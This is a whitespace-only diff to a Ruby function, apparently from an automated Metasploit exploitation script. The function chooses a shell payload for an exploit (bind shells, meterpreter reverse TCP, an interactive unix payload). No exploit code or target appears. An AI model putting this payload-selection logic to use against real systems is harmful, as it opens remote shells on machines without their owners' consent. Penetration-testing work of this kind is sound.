@@ -34,33 +34,33 @@ def wait_until_jobs_done
 end
 
 def select_payload(exploit,arch)
-	linux   = "linux/#{arch}/shell_bind_tcp"
+  linux   = "linux/#{arch}/shell_bind_tcp"
   php     = 'php/meterpreter_reverse_tcp'
-	multi   = 'java/meterpreter/reverse_tcp'
-	cmd     = 'cmd/unix/interact'
-	generic = 'generic/shell_bind_tcp'
+  multi   = 'java/meterpreter/reverse_tcp'
+  cmd     = 'cmd/unix/interact'
+  generic = 'generic/shell_bind_tcp'
 
-	payloads = []
-	exploit.compatible_payloads.each do |p|
-		payloads << p[0]
-	end
+  payloads = []
+  exploit.compatible_payloads.each do |p|
+    payloads << p[0]
+  end
 
-	if payloads.include?(linux)
-		return linux
-	elsif payloads.include?(php)
-		return php
-	elsif payloads.include?(multi)
-		return multi
-	elsif payloads.include?(cmd)
-		return cmd
-	elsif payloads.include?(generic)
-		return generic
-	else
-		# WTF? This exploit supports NONE of our favorite payloads?
-		# What kinda BS is this?
-		return linux
-		#return nil
-	end
+  if payloads.include?(linux)
+    return linux
+  elsif payloads.include?(php)
+    return php
+  elsif payloads.include?(multi)
+    return multi
+  elsif payloads.include?(cmd)
+    return cmd
+  elsif payloads.include?(generic)
+    return generic
+  else
+    # WTF? This exploit supports NONE of our favorite payloads?
+    # What kinda BS is this?
+    return linux
+    #return nil
+  end
 end
 
 def exploit_checker(host,ports,architecture)
